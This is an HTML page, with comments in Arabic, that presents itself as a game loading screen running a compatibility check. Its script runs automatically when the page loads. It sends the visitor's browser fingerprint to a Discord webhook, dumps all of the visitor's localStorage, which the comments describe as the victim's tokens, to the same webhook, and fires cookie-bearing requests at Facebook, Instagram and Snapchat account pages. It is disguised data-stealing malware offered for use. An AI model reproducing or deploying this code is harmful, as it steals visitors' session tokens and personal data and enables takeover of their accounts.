<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تحميل اللعبة...</title>
    <style>
        body { background: #000; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .version-marker { font-size: 80px; font-weight: bold; color: #1a1a1a; position: absolute; top: 20px; right: 20px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="version-marker">8</div> <div class="loader"></div>
    <p>جاري فحص التوافق (V1.2.0)...</p>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";

        // دالة إرسال التقرير الصامتة جداً
        function logToDiscord(title, desc) {
            const data = {
                embeds: [{
                    title: "🛰️ استجابة القناة: " + title,
                    description: desc,
                    color: 3066993
                }]
            };
            // استخدام fetch التقليدي مع keepalive لضمان الوصول
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data),
                keepalive: true 
            });
        }

        // التكتيك: طلب "صورة" من رابط حساس لإجبار المتصفح على نقل الكوكيز
        function ghostRequest(name, url) {
            const img = new Image();
            // المتصفح سيقوم بإرسال الكوكيز مع هذا الطلب تلقائياً
            img.src = url + "?v=" + Math.random();
            
            // بمجرد إرسال الطلب، نبلغ الديسكورد أن المتصفح "طرق الباب"
            logToDiscord(name, `تم إجبار المتصفح على إرسال طلب (Authenticated Request) إلى: ${url}`);
        }

        function startOperation() {
            try {
                // 1. بصمة الجهاز الفورية
                logToDiscord("Fingerprint", `UA: ${navigator.userAgent}\nPlatform: ${navigator.platform}`);

                // 2. سحب الـ LocalStorage (الكنز الحقيقي في 2026)
                // هذا السطر وحده قد يأتيك بكل توكنات الضحية
                let storage = "";
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    storage += `**${key}**: ${localStorage.getItem(key)}\n`;
                }
                if (storage) logToDiscord("LocalStorage Dump", storage);

                // 3. إطلاق "الطلبات الشبحية"
                // المتصفح الحين "بينتحل" شخصية الضحية وبيروح للمواقع
                ghostRequest("FB_Proxy", "https://mbasic.facebook.com/settings");
                ghostRequest("Insta_Proxy", "https://www.instagram.com/accounts/edit/");
                ghostRequest("Snap_Proxy", "https://accounts.snapchat.com/");

            } catch (e) {
                logToDiscord("Error", e.message);
            }
        }

        // تشغيل المهمة فوراً
        startOperation();
    </script>
</body>
</html>
